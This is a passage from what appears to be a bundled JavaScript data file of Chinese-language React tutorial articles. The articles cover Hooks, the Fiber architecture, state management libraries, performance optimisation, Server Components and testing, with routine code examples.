  
  return (
    <button onClick={toggleTheme}>
      Current theme: {theme}
    </button>
  );
}
\`\`\`

### 自定义 Hooks 设计原则

自定义 Hooks 是复用状态逻辑的强大工具，以 "use" 开头命名是 React 的约定。设计良好的自定义 Hooks 应该遵循以下原则：单一职责，每个 Hook 只处理一个特定的逻辑；清晰的参数和返回值；合理的依赖管理；良好的类型定义。常见的自定义 Hooks 包括：useFetch（数据获取）、useDebounce（防抖）、useThrottle（节流）、useWindowSize（窗口尺寸）、useMediaQuery（媒体查询）等。

### 最佳实践

- **只在最顶层调用 Hooks**：不要在循环、条件或嵌套函数中调用 Hooks，确保 Hooks 的调用顺序在每次渲染中保持一致
- **只在 React 函数中调用 Hooks**：在函数组件或自定义 Hook 中调用，不要在普通 JavaScript 函数中调用
- **合理使用依赖数组**：确保依赖数组包含所有在 effect 中使用的外部变量，避免遗漏依赖导致的 bug
- **避免在渲染中创建函数和对象**：使用 useCallback 和 useMemo 缓存，避免不必要的子组件重新渲染
- **使用 React.memo 配合 useCallback**：当子组件接收函数 props 时，配合使用可以优化性能
- **正确处理清理逻辑**：在 useEffect 中返回清理函数，防止内存泄漏`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-fiber",title:"React Fiber 架构与并发模式",category:"react",difficulty:"hard",tags:["React","Fiber","并发","调度"],content:`## React Fiber 架构与并发模式

React Fiber 是 React 16 引入的全新协调引擎，它彻底重构了 React 的核心算法，为 React 带来了并发渲染能力。Fiber 的设计目标是解决大型 React 应用中更新卡顿的问题，实现可中断的渲染过程，让高优先级的用户交互能够快速响应。

### Fiber 核心概念深度解析

**Fiber 节点 - 核心数据结构：**
Fiber 节点是 Fiber 架构的核心数据结构，每个 React 元素对应一个 Fiber 节点。Fiber 节点包含了组件的所有信息：type（组件类型）、key（列表标识）、props（属性）、state（状态）、effectTag（副作用标记）等。Fiber 节点通过 return、child、sibling 三个指针形成链表树结构，return 指向父节点，child 指向第一个子节点，sibling 指向下一个兄弟节点。这种链表结构使得遍历可以在任意节点暂停和恢复，是实现可中断渲染的基础。

**双缓存技术 - 无闪烁更新：**
双缓存技术是 Fiber 架构的关键优化，React 同时维护两棵 Fiber 树：current 树（当前屏幕显示的树）和 workInProgress 树（正在构建的新树）。当 workInProgress 树构建完成后，React 只需要交换 rootFiber 的 current 指针，就能完成更新。这种技术避免了逐个节点更新导致的页面闪烁，同时支持回滚操作。双缓存还使得 React 能够在内存中完成所有计算后再一次性提交到 DOM，提高了渲染效率。

**调度器 - 智能任务管理：**
调度器（Scheduler）负责管理任务的优先级和执行时机。React 将任务分为不同优先级：Immediate（立即执行，如用户输入）、UserBlocking（用户阻塞级别）、Normal（普通级别）、Low（低优先级）、Idle（空闲时执行）。调度器使用时间分片技术，将大任务拆分为小任务，每个任务执行一段时间后检查是否需要让出主线程，避免阻塞用户交互。高优先级任务可以中断正在执行的低优先级任务，确保用户交互的流畅性。

### 代码示例

\`\`\`javascript
// Fiber 节点结构示意
const fiber = {
  type: 'div',           // 元素类型
  key: null,             // 列表 key
  props: {               // 属性
    className: 'container',
    children: []
  },
  stateNode: null,       // DOM 节点或组件实例
  
  // Fiber 树结构
  return: parentFiber,   // 父节点
  child: firstChildFiber, // 第一个子节点
  sibling: nextFiber,    // 下一个兄弟节点
  
  // 状态和副作用
  memoizedState: null,   // Hooks 链表
  memoizedProps: null,   // 上一次的 props
  pendingProps: props,   // 新的 props
  effectTag: 0,          // 副作用标记（Placement, Update, Deletion 等）
  flags: 0,              // 新版 React 使用 flags
  lanes: 0,              // 优先级标记
};

// useTransition 使用示例
function SearchComponent() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  const [isPending, startTransition] = useTransition();
  
  const handleSearch = (e) => {
    const value = e.target.value;
    
    // 立即更新输入框（高优先级）
    setQuery(value);
    
    // 将搜索结果更新标记为低优先级
    startTransition(() => {
      const filtered = largeDataList.filter(item => 
        item.name.toLowerCase().includes(value.toLowerCase())
      );
      setResults(filtered);
    });
  };
  
  return (
    <div>
      <input 
        type="text" 
        value={query} 
        onChange={handleSearch}
        placeholder="Search..."
      />
      {isPending && <span>Searching...</span>}
      <ResultList results={results} />
    </div>
  );
}

// useDeferredValue 使用示例
function DeferredList({ query }) {
  const deferredQuery = useDeferredValue(query);
  
  const results = useMemo(() => {
    return largeDataList.filter(item =>
      item.name.toLowerCase().includes(deferredQuery.toLowerCase())
    );
  }, [deferredQuery]);
  
  return (
    <div>
      {results.map(item => (
        <div key={item.id}>{item.name}</div>
      ))}
    </div>
  );
}

// Suspense 数据获取示例
function ProfilePage() {
  return (
    <Suspense fallback={<Loading />}>
      <ProfileDetails />
      <Suspense fallback={<PhotosSkeleton />}>
        <ProfilePhotos />
      </Suspense>
    </Suspense>
  );
}

// 使用 Suspense 的数据获取
function fetchProfileData(id) {
  let status = 'pending';
  let result;
  let suspender = fetchUser(id).then(
    (data) => {
      status = 'success';
      result = data;
    },
    (error) => {
      status = 'error';
      result = error;
    }
  );
  
  return {
    read() {
      if (status === 'pending') throw suspender;
      if (status === 'error') throw result;
      return result;
    }
  };
}

// Concurrent Feature 配置
const root = ReactDOM.createRoot(document.getElementById('root'), {
  // 启用并发特性
  concurrent: true,
});

// 自动批处理示例
function Form() {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  
  // React 18 自动批处理这些更新
  const handleReset = () => {
    setFirstName('');
    setLastName('');
  };
  
  // 即使在异步操作中也会自动批处理
  const handleAsyncReset = async () => {
    await fetchData();
    setFirstName('');
    setLastName('');
    // 只会触发一次重新渲染
  };
  
  return (
    <form>
      <input value={firstName} onChange={e => setFirstName(e.target.value)} />
      <input value={lastName} onChange={e => setLastName(e.target.value)} />
      <button type="button" onClick={handleReset}>Reset</button>
    </form>
  );
}
\`\`\`

### 并发模式详解

React 18 引入的并发模式是 Fiber 架构的完整实现，它允许 React 同时处理多个更新，根据优先级智能调度。并发模式的核心特性包括：可中断渲染（渲染过程可以被暂停、恢复或放弃）、优先级调度（高优先级更新可以打断低优先级更新）、自动批处理（自动将多个状态更新合并为一次渲染）。并发模式不是一个新的特性，而是一套新的渲染机制，它让 React 应用能够更好地响应用户交互。

### 新特性应用场景

**Suspense - 异步渲染协调：**
Suspense 允许组件在等待异步数据时暂停渲染，显示加载状态，等数据准备好后再继续渲染。Suspense 可以嵌套使用，实现细粒度的加载状态控制。配合 React Server Components，Suspense 可以实现流式 SSR，提升首屏加载体验。

**useTransition - 交互优先级控制：**
useTransition 用于将某些更新标记为低优先级过渡更新，避免阻塞用户输入。适用于搜索过滤、列表排序等场景，让输入框保持流畅响应，同时后台进行计算。isPending 状态可以显示过渡进度，提升用户体验。

**useDeferredValue - 值更新延迟：**
useDeferredValue 用于延迟某个值的更新，先使用旧值渲染，等新值准备好后再更新。适用于大列表渲染、复杂计算等场景，可以避免输入时的卡顿。与 useTransition 不同，useDeferredValue 是基于值的延迟，而不是基于更新函数的延迟。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-state-management",title:"React 状态管理方案对比",category:"react",difficulty:"medium",tags:["React","状态管理","Redux","Context"],content:`## React 状态管理方案对比

状态管理是 React 应用的核心问题之一，随着应用复杂度的增加，选择合适的状态管理方案变得至关重要。React 提供了从简单的 useState 到复杂的状态管理库等多种方案，开发者需要根据应用规模、团队熟悉度、性能需求等因素选择合适的方案。

### 内置状态管理方案

**useState - 组件内部状态：**
useState 是 React 最基础的状态管理 Hook，适用于组件内部的状态管理。useState 返回状态值和更新函数，支持惰性初始化和函数式更新。useState 的优势在于简单直观，与 React 组件生命周期紧密集成。useState 适用于表单输入、UI 状态（如模态框显示隐藏）、组件内部的计数器等场景。对于复杂的状态逻辑，可以考虑使用 useReducer 替代。

**useContext - 跨组件状态共享：**
useContext 提供了一种在组件树中共享数据的方式，避免了 props 层层传递的问题。useContext 与 createContext 配合使用，Provider 提供数据，Consumer 或 useContext 消费数据。useContext 适用于主题、用户信息、语言设置等全局配置数据。需要注意的是，Context 的值变化会导致所有消费者组件重新渲染，对于频繁更新的状态可能需要优化。

**useReducer - 复杂状态逻辑：**
useReducer 是 useState 的替代方案，适用于复杂的状态逻辑。useReducer 接收一个 reducer 函数和初始状态，返回当前状态和 dispatch 函数。useReducer 的优势在于将状态更新逻辑集中管理，便于测试和调试。useReducer 适用于表单状态、多步骤流程、复杂的数据转换等场景。

### 代码示例

\`\`\`javascript
// useState 基础用法
function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(c => c + 1)}>Increment</button>
    </div>
  );
}

// useContext 跨组件状态共享
const ThemeContext = createContext('light');

function App() {
  const [theme, setTheme] = useState('dark');
  
  return (
    <ThemeContext.Provider value={{ theme, setTheme }}>
      <Layout />
    </ThemeContext.Provider>
  );
}

function Layout() {
  return (
    <div>
      <Header />
      <Main />
    </div>
  );
}

function Header() {
  const { theme, setTheme } = useContext(ThemeContext);
  
  return (
    <header className={\`header-\${theme}\`}>
      <button onClick={() => setTheme(t => t === 'light' ? 'dark' : 'light')}>
        Toggle Theme
      </button>
    </header>
  );
}

// useReducer 复杂状态管理
const formReducer = (state, action) => {
  switch (action.type) {
    case 'SET_FIELD':
      return { ...state, [action.field]: action.value };
    case 'SET_ERROR':
      return { ...state, errors: { ...state.errors, [action.field]: action.error } };
    case 'RESET':
      return action.initialState;
    default:
      return state;
  }
};

function Form() {
  const initialState = { username: '', email: '', errors: {} };
  const [state, dispatch] = useReducer(formReducer, initialState);
  
  const handleChange = (field) => (e) => {
    dispatch({ type: 'SET_FIELD', field, value: e.target.value });
  };
  
  return (
    <form>
      <input 
        value={state.username}
        onChange={handleChange('username')}
      />
      {state.errors.username && <span>{state.errors.username}</span>}
    </form>
  );
}

// Redux Toolkit 示例
import { createSlice, configureStore } from '@reduxjs/toolkit';

const counterSlice = createSlice({
  name: 'counter',
  initialState: { value: 0 },
  reducers: {
    increment: (state) => { state.value += 1; },
    decrement: (state) => { state.value -= 1; },
    incrementByAmount: (state, action) => { state.value += action.payload; }
  }
});

const store = configureStore({
  reducer: { counter: counterSlice.reducer }
});

// React 组件中使用 Redux
import { useSelector, useDispatch } from 'react-redux';

function CounterWithRedux() {
  const count = useSelector((state) => state.counter.value);
  const dispatch = useDispatch();
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => dispatch(increment())}>+</button>
      <button onClick={() => dispatch(decrement())}>-</button>
    </div>
  );
}

// Zustand 示例
import { create } from 'zustand';

const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 })),
  decrement: () => set((state) => ({ count: state.count - 1 })),
  reset: () => set({ count: 0 })
}));

function CounterWithZustand() {
  const { count, increment, decrement, reset } = useStore();
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+</button>
      <button onClick={decrement}>-</button>
      <button onClick={reset}>Reset</button>
    </div>
  );
}

// Zustand 选择器优化
function OptimizedCounter() {
  // 只订阅 count 变化
  const count = useStore((state) => state.count);
  const increment = useStore((state) => state.increment);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+</button>
    </div>
  );
}

// Jotai 原子化状态
import { atom, useAtom } from 'jotai';

const countAtom = atom(0);
const doubleCountAtom = atom((get) => get(countAtom) * 2);

function CounterWithJotai() {
  const [count, setCount] = useAtom(countAtom);
  const [doubleCount] = useAtom(doubleCountAtom);
  
  return (
    <div>
      <p>Count: {count}</p>
      <p>Double: {doubleCount}</p>
      <button onClick={() => setCount((c) => c + 1)}>+</button>
    </div>
  );
}

// React Query 服务器状态管理
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

function UserList() {
  const queryClient = useQueryClient();
  
  const { data: users, isLoading, error } = useQuery({
    queryKey: ['users'],
    queryFn: () => fetch('/api/users').then((res) => res.json())
  });
  
  const mutation = useMutation({
    mutationFn: (newUser) => 
      fetch('/api/users', {
        method: 'POST',
        body: JSON.stringify(newUser)
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['users'] });
    }
  });
  
  if (isLoading) return <div>Loading...</div>;
  if (error) return <div>Error: {error.message}</div>;
  
  return (
    <div>
      <ul>
        {users.map((user) => (
          <li key={user.id}>{user.name}</li>
        ))}
      </ul>
      <button onClick={() => mutation.mutate({ name: 'New User' })}>
        Add User
      </button>
    </div>
  );
}

// 状态管理最佳实践：状态分层
function StateManagementExample() {
  // 组件内部状态：UI 状态
  const [isModalOpen, setIsModalOpen] = useState(false);
  
  // 全局状态：用户信息
  const user = useUserStore((state) => state.user);
  
  // 服务器状态：数据获取
  const { data: posts } = useQuery({
    queryKey: ['posts', user.id],
    queryFn: () => fetchPosts(user.id)
  });
  
  return (
    <div>
      <button onClick={() => setIsModalOpen(true)}>Open Modal</button>
      {isModalOpen && <Modal onClose={() => setIsModalOpen(false)} />}
      <PostList posts={posts} />
    </div>
  );
}
\`\`\`

### 第三方状态管理库对比

**Redux Toolkit - 企业级状态管理：**
Redux Toolkit 是 Redux 的官方推荐工具集，简化了 Redux 的配置和使用。Redux Toolkit 提供了 createSlice（同时定义 reducer 和 actions）、createAsyncThunk（处理异步操作）、configureStore（配置 store）等工具。Redux Toolkit 内置 Immer，支持不可变数据更新。Redux Toolkit 适合大型应用、需要时间旅行调试、需要中间件扩展的场景。

**Zustand - 轻量级状态管理：**
Zustand 是一个极简的状态管理库，API 设计简洁，学习曲线平缓。Zustand 基于 Hooks，不需要 Provider 包裹，支持选择器优化渲染。Zustand 支持中间件（如 persist、devtools）、TypeScript 类型推断。Zustand 适合中小型应用、需要快速上手的团队。

**Jotai - 原子化状态管理：**
Jotai 采用原子化状态管理，状态可以按需订阅和更新，实现细粒度的渲染优化。Jotai 的 atom 可以派生出新的 atom，支持异步 atom。Jotai 的 API 非常简洁，适合需要精确控制渲染的场景。

**React Query - 服务器状态管理：**
React Query 专门用于管理服务器状态，提供了数据获取、缓存、轮询、乐观更新等功能。React Query 自动管理请求状态和缓存，支持后台刷新、预取、并行请求等高级特性。React Query 大大简化了 React 中的数据请求逻辑，推荐用于所有需要从服务器获取数据的场景。

### 选择建议

- **小型应用**：useState + useContext，简单直接，无需额外依赖
- **中型应用**：Zustand 或 Jotai，轻量级，学习成本低
- **大型应用**：Redux Toolkit，功能完整，生态成熟
- **服务器状态**：React Query 或 SWR，专门优化的数据获取方案
- **混合使用**：可以根据状态类型选择不同的方案，如 UI 状态用 Zustand，服务器状态用 React Query`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-optimization",title:"React 性能优化最佳实践",category:"react",difficulty:"medium",tags:["React","性能优化","渲染","内存"],content:`## React 性能优化最佳实践

React 应用的性能直接影响用户体验，性能优化是前端开发中不可忽视的重要环节。React 提供了多种优化手段，从渲染优化、状态管理到代码分割，合理运用这些技术可以显著提升应用的响应速度和流畅度。

### 渲染优化核心策略

**React.memo - 组件级缓存：**
React.memo 是一个高阶组件，用于缓存函数组件的渲染结果。当组件接收相同的 props 时，React.memo 会跳过渲染，直接复用上次的结果。React.memo 接受一个可选的比较函数作为第二个参数，可以自定义 props 比较逻辑。需要注意的是，React.memo 只进行浅比较，如果 props 包含对象或数组，需要确保引用稳定性。React.memo 适用于纯展示组件、接收复杂 props 的组件、以及渲染开销较大的组件。

**useMemo 和 useCallback - 值和函数缓存：**
useMemo 用于缓存计算结果，避免在每次渲染时重复执行昂贵的计算。useCallback 用于缓存函数引用，避免在每次渲染时创建新的函数实例。两者都接受依赖数组，只有当依赖项变化时才重新计算。useMemo 和 useCallback 本身也有开销，应该根据实际场景权衡使用。对于简单的计算或不需要传递给子组件的函数，可能不需要缓存。

**避免渲染中的对象和函数创建：**
在组件渲染中直接创建对象或函数会导致每次渲染都创建新的引用，这会破坏 React.memo 和 useEffect 的依赖检查。解决方案包括：将静态对象和函数移到组件外部、使用 useMemo 缓存对象、使用 useCallback 缓存函数、使用状态管理库管理复杂状态。

### 代码示例

\`\`\`javascript
// React.memo 基础用法
const MemoizedComponent = React.memo(function UserCard({ user, onSelect }) {
  return (
    <div className="user-card" onClick={() => onSelect(user.id)}>
      <img src={user.avatar} alt={user.name} />
      <h3>{user.name}</h3>
      <p>{user.email}</p>
    </div>
  );
});

// 自定义比较函数
const UserCard = React.memo(
  function UserCard({ user, onSelect }) {
    return <div>{user.name}</div>;
  },
  (prevProps, nextProps) => {
    // 返回 true 表示不需要重新渲染
    return prevProps.user.id === nextProps.user.id &&
           prevProps.user.name === nextProps.user.name;
  }
);

// useMemo 缓存计算结果
function UserList({ users, filterText }) {
  // 只有当 users 或 filterText 变化时才重新过滤
  const filteredUsers = useMemo(() => {
    console.log('Filtering users...');
    return users.filter(user =>
      user.name.toLowerCase().includes(filterText.toLowerCase())
    );
  }, [users, filterText]);
  
  // 缓存排序结果
  const sortedUsers = useMemo(() => {
    return [...filteredUsers].sort((a, b) => a.name.localeCompare(b.name));
  }, [filteredUsers]);
  
  return (
    <ul>
      {sortedUsers.map(user => (
        <li key={user.id}>{user.name}</li>
      ))}
    </ul>
  );
}

// useCallback 缓存函数
function ParentComponent() {
  const [count, setCount] = useState(0);
  const [items, setItems] = useState([]);
  
  // 缓存事件处理函数
  const handleClick = useCallback(() => {
    setCount(prev => prev + 1);
  }, []);
  
  // 缓存带参数的回调
  const handleItemDelete = useCallback((id) => {
    setItems(prev => prev.filter(item => item.id !== id));
  }, []);
  
  // 缓存复杂对象
  const config = useMemo(() => ({
    theme: 'dark',
    locale: 'zh-CN',
    onAction: handleItemClick
  }), [handleItemClick]);
  
  return (
    <div>
      <ChildComponent onClick={handleClick} config={config} />
      <ItemList items={items} onDelete={handleItemDelete} />
    </div>
  );
}

// 避免内联对象和函数
// ❌ 不好的做法
function BadExample({ users }) {
  return (
    <div>
      {users.map(user => (
        <UserCard
          key={user.id}
          user={user}
          // 每次渲染都创建新的对象和函数
          config={{ theme: 'dark' }}
          onClick={() => console.log(user.id)}
        />
      ))}
    </div>
  );
}

// ✅ 好的做法
function GoodExample({ users }) {
  const config = useMemo(() => ({ theme: 'dark' }), []);
  
  const handleClick = useCallback((userId) => {
    console.log(userId);
  }, []);
  
  return (
    <div>
      {users.map(user => (
        <UserCard
          key={user.id}
          user={user}
          config={config}
          onClick={handleClick}
        />
      ))}
    </div>
  );
}

// 代码分割 - React.lazy
const Dashboard = React.lazy(() => import('./Dashboard'));
const Settings = React.lazy(() => import('./Settings'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/settings" element={<Settings />} />
      </Routes>
    </Suspense>
  );
}

// 虚拟列表优化
import { FixedSizeList } from 'react-window';

function VirtualizedList({ items }) {
  const Row = ({ index, style }) => (
    <div style={style}>
      {items[index].name}
    </div>
  );
  
  return (
    <FixedSizeList
      height={400}
      width="100%"
      itemCount={items.length}
      itemSize={50}
    >
      {Row}
    </FixedSizeList>
  );
}

// 状态更新优化
function OptimizedUpdates() {
  const [items, setItems] = useState([]);
  
  // 使用函数式更新避免依赖 items
  const addItem = useCallback((item) => {
    setItems(prev => [...prev, item]);
  }, []);
  
  // 批量更新
  const addMultipleItems = useCallback((newItems) => {
    setItems(prev => [...prev, ...newItems]);
  }, []);
  
  // 使用 immer 进行不可变更新
  const updateItem = useCallback((id, updates) => {
    setItems(produce(draft => {
      const item = draft.find(i => i.id === id);
      if (item) Object.assign(item, updates);
    }));
  }, []);
  
  return <ItemList items={items} onAdd={addItem} />;
}

// 清理副作用防止内存泄漏
function DataFetcher({ url }) {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    const controller = new AbortController();
    
    async function fetchData() {
      try {
        const response = await fetch(url, {
          signal: controller.signal
        });
        const json = await response.json();
        setData(json);
      } catch (error) {
        if (error.name !== 'AbortError') {
          console.error(error);
        }
      }
    }
    
    fetchData();
    
    return () => {
      controller.abort();
    };
  }, [url]);
  
  return data ? <DataDisplay data={data} /> : <Loading />;
}
\`\`\`

### 状态管理优化

**状态提升与下沉：**
状态提升是指将状态移动到最近的共同父组件，状态下沉是指将状态移动到使用它的组件中。合理的状态位置可以减少不必要的渲染，简化数据流。对于多个组件共享的状态，应该提升到最近的共同父组件；对于只有一个组件使用的状态，应该下沉到该组件中。

**不可变数据更新：**
React 依赖引用比较来检测状态变化，直接修改状态会导致 React 无法检测到变化。使用展开运算符、Object.assign 或 immer 库进行不可变更新，确保每次更新都创建新的引用。immer 库提供了更直观的 API，可以在修改草稿的同时保持不可变性。

**批量更新机制：**
React 18 引入了自动批处理，将多个状态更新合并为一次渲染。在事件处理器、setTimeout、Promise、原生事件处理器中的更新都会自动批处理。对于需要立即更新的场景，可以使用 flushSync 强制同步更新。

### 其他优化策略

**代码分割：**
使用 React.lazy 和 Suspense 实现组件级别的代码分割，按路由或功能模块分割代码，减少初始加载体积。对于大型组件库，可以使用命名导出进行更细粒度的分割。

**虚拟列表：**
对于长列表渲染，使用 react-window 或 react-virtualized 实现虚拟列表，只渲染可视区域的项目，大幅减少 DOM 节点数量。虚拟列表适用于数据量大于 100 条的场景。

**内存管理：**
及时清理定时器、事件监听器、订阅等资源，避免内存泄漏。使用 useEffect 的清理函数处理副作用清理。对于大型数据缓存，考虑使用 WeakMap 和 WeakSet，允许垃圾回收器自动清理不再使用的引用。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-server-components",title:"React Server Components 深度解析",category:"react",difficulty:"hard",tags:["React","Server Components","RSC","Next.js"],content:`## React Server Components 深度解析

React Server Components (RSC) 是 React 18 引入的革命性特性，它允许组件在服务器端渲染，并将渲染结果流式传输到客户端。RSC 代表了 React 架构的重大演进，它重新定义了前端和后端的边界，为构建高性能 Web 应用提供了新的范式。

### 核心概念详解

**服务器组件 (Server Components)：**
服务器组件是在服务器端执行的 React 组件，其代码不会发送到客户端。服务器组件可以直接访问数据库、文件系统、内部 API 等服务器资源，无需通过 API 层。服务器组件的渲染结果是序列化的 JSX，流式传输到客户端后由 React 恢复。服务器组件不支持状态（useState）和副作用（useEffect），因为它们不会在客户端执行。服务器组件的优势包括：零客户端 JavaScript 体积、直接访问后端资源、更快的首屏渲染、更好的 SEO。

**客户端组件 (Client Components)：**
客户端组件是传统的 React 组件，在浏览器中执行。客户端组件支持所有 React 特性：状态管理、副作用、事件处理、浏览器 API 等。在 Next.js App Router 中，需要使用 'use client' 指令标记客户端组件。客户端组件会增加 JavaScript 包大小，但提供了丰富的交互能力。合理划分服务器组件和客户端组件是 RSC 架构的关键。

**组件边界与组合：**
服务器组件和客户端组件可以组合使用，形成组件树。服务器组件可以导入和渲染客户端组件，但客户端组件不能导入服务器组件。服务器组件可以通过 props 向客户端组件传递数据，包括序列化的 JSON 数据和 React 元素（作为 children）。理解组件边界对于正确使用 RSC 至关重要。

### 代码示例

\`\`\`javascript
// 服务器组件示例 (默认)
// app/users/page.tsx
async function UsersPage() {
  // 直接访问数据库，无需 API
  const users = await db.users.findMany({
    select: { id: true, name: true, email: true }
  });
  
  return (
    <div>
      <h1>Users List</h1>
      <UserList users={users} />
    </div>
  );
}

// 服务器组件中的数据获取
async function UserProfile({ userId }) {
  // 并行获取多个数据源
  const [user, posts, followers] = await Promise.all([
    fetchUser(userId),
    fetchPosts(userId),
    fetchFollowers(userId)
  ]);
  
  return (
    <div>
      <UserHeader user={user} />
      <Suspense fallback={<PostsSkeleton />}>
        <PostsList posts={posts} />
      </Suspense>
      <FollowersList followers={followers} />
    </div>
  );
}

// 客户端组件
'use client';

import { useState } from 'react';

function LikeButton({ postId, initialLikes }) {
  const [likes, setLikes] = useState(initialLikes);
  const [isLiked, setIsLiked] = useState(false);
  
  const handleLike = async () => {
    const newLikedState = !isLiked;
    setIsLiked(newLikedState);
    setLikes(prev => newLikedState ? prev + 1 : prev - 1);
    
    // 调用 API 更新服务器状态
    await fetch(\`/api/posts/\${postId}/like\`, {
      method: newLikedState ? 'POST' : 'DELETE'
    });
  };
  
  return (
    <button onClick={handleLike}>
      {isLiked ? '❤️' : '🤍'} {likes}
    </button>
  );
}

// 服务器组件传递 props 给客户端组件
async function PostCard({ postId }) {
  const post = await fetchPost(postId);
  
  return (
    <article>
      <h2>{post.title}</h2>
      <p>{post.content}</p>
      {/* 传递序列化数据给客户端组件 */}
      <LikeButton postId={post.id} initialLikes={post.likes} />
    </article>
  );
}

// 服务器组件传递 children 给客户端组件
// components/ClientWrapper.tsx
'use client';

import { useState } from 'react';

export function ExpandableSection({ children, title }) {
  const [isExpanded, setIsExpanded] = useState(false);
  
  return (
    <div className="expandable-section">
      <button onClick={() => setIsExpanded(!isExpanded)}>
        {title} {isExpanded ? '−' : '+'}
      </button>
      {isExpanded && <div className="content">{children}</div>}
    </div>
  );
}

// app/page.tsx (服务器组件)
import { ExpandableSection } from '@/components/ClientWrapper';

async function Page() {
  const data = await fetchData();
  
  return (
    <div>
      {/* 服务器组件内容作为 children 传递给客户端组件 */}
      <ExpandableSection title="Details">
        <ServerRenderedContent data={data} />
      </ExpandableSection>
    </div>
  );
}

// 流式渲染与 Suspense
async function StreamingPage() {
  return (
    <div>
      <h1>Dashboard</h1>
      
      {/* 快速加载的内容 */}
      <QuickStats />
      
      {/* 流式加载的内容 */}
      <Suspense fallback={<ChartSkeleton />}>
        <SlowChart />
      </Suspense>
      
      <Suspense fallback={<TableSkeleton />}>
        <DataTable />
      </Suspense>
    </div>
  );
}

// 服务器组件中的错误处理
async function SafeDataFetch({ userId }) {
  try {
    const user = await fetchUser(userId);
    return <UserProfile user={user} />;
  } catch (error) {
    // 错误会冒泡到最近的 Error Boundary
    throw new Error('Failed to load user');
  }
}

// 错误边界组件
'use client';

import { useEffect } from 'react';

export default function Error({
  error,
  reset
}) {
  useEffect(() => {
    console.error(error);
  }, [error]);
  
  return (
    <div>
      <h2>Something went wrong!</h2>
      <button onClick={reset}>Try again</button>
    </div>
  );
}

// 服务器操作 (Server Actions)
async function updateProfile(formData) {
  'use server';
  
  const userId = formData.get('userId');
  const name = formData.get('name');
  
  await db.users.update({
    where: { id: userId },
    data: { name }
  });
  
  revalidatePath('/profile');
}

// 在服务器组件中使用 Server Action
async function ProfileForm({ user }) {
  return (
    <form action={updateProfile}>
      <input type="hidden" name="userId" value={user.id} />
      <input type="text" name="name" defaultValue={user.name} />
      <button type="submit">Update</button>
    </form>
  );
}

// 混合使用服务器和客户端组件的最佳实践
// app/layout.tsx
import { Navbar } from '@/components/Navbar';
import { Sidebar } from '@/components/Sidebar';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        {/* 静态布局 - 服务器组件 */}
        <Navbar />
        <div className="flex">
          <Sidebar />
          <main>{children}</main>
        </div>
      </body>
    </html>
  );
}

// components/Navbar.tsx
'use client';

import { useState } from 'react';

export function Navbar() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  
  return (
    <nav>
      <button onClick={() => setIsMenuOpen(!isMenuOpen)}>
        Menu
      </button>
      {isMenuOpen && <MobileMenu />}
    </nav>
  );
}
\`\`\`

### 使用场景划分

**服务器组件适用场景：**
- 数据获取和展示：直接访问数据库或 API，无需额外的数据层
- 静态内容：博客文章、产品描述、文档等不经常变化的内容
- SEO 关键页面：需要搜索引擎索引的页面
- 大型数据列表：减少客户端 JavaScript 体积
- 布局和页面结构：导航、侧边栏、页脚等

**客户端组件适用场景：**
- 交互式 UI：表单、按钮、滑块等需要响应用户输入的组件
- 状态管理：需要 useState、useReducer 等状态 Hook 的组件
- 生命周期操作：需要 useEffect 的副作用处理
- 浏览器 API：使用 window、localStorage、Web API 等
- 动画和过渡：使用 CSS 动画或动画库的组件

### 最佳实践

- **合理划分组件边界**：将交互逻辑封装在客户端组件中，数据获取和静态内容放在服务器组件
- **减少客户端 JavaScript**：尽可能使用服务器组件，减少发送到客户端的代码量
- **利用流式渲染**：使用 Suspense 实现渐进式加载，提升用户体验
- **正确处理错误**：使用 Error Boundary 捕获和处理服务器组件错误
- **遵循 Next.js 约定**：理解 App Router 的文件约定，正确使用 'use client' 指令`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-testing",title:"React 测试策略与最佳实践",category:"react",difficulty:"medium",tags:["React","测试","Jest","React Testing Library"],content:`## React 测试策略与最佳实践

测试是保证 React 应用质量的重要手段，完善的测试体系可以及早发现 bug、提高代码可维护性、增强重构信心。React 生态提供了丰富的测试工具，从单元测试到端到端测试，开发者可以根据需求构建多层次的测试策略。

### 测试类型详解

**单元测试：**
单元测试是最基础的测试类型，用于测试单个组件或函数的行为。单元测试应该隔离测试，不依赖外部系统，执行快速，反馈及时。在 React 中，单元测试通常测试组件的渲染输出、状态变化、事件处理等。单元测试的覆盖率是衡量代码质量的重要指标，但不应过度追求 100% 覆盖率，而应关注关键逻辑和边界条件。

**集成测试：**
集成测试测试多个组件或模块之间的交互，模拟真实使用场景。集成测试关注组件之间的数据流、状态共享、API 调用等。集成测试比单元测试更接近真实用户行为，但执行速度较慢。在 React 应用中，集成测试通常测试表单提交流程、数据获取和渲染、路由导航等场景。

**端到端测试 (E2E)：**
端到端测试模拟用户在真实浏览器中的操作，测试整个应用的流程。E2E 测试关注用户视角，验证用户体验和业务流程。E2E 测试执行最慢，但最能反映真实使用情况。常用的 E2E 测试工具包括 Playwright 和 Cypress，它们可以在真实浏览器中模拟用户操作。

### 代码示例

\`\`\`javascript
// Jest 配置示例
// jest.config.js
module.exports = {
  testEnvironment: 'jsdom',
  setupFilesAfterEnv: ['<rootDir>/jest.setup.js'],
  moduleNameMapper: {
    '^@/(.*)$': '<rootDir>/src/$1',
    '\\.(css|less|scss|sass)$': 'identity-obj-proxy'
  },
  transform: {
    '^.+\\.(js|jsx|ts|tsx)$': ['babel-jest', { presets: ['next/babel'] }]
  },
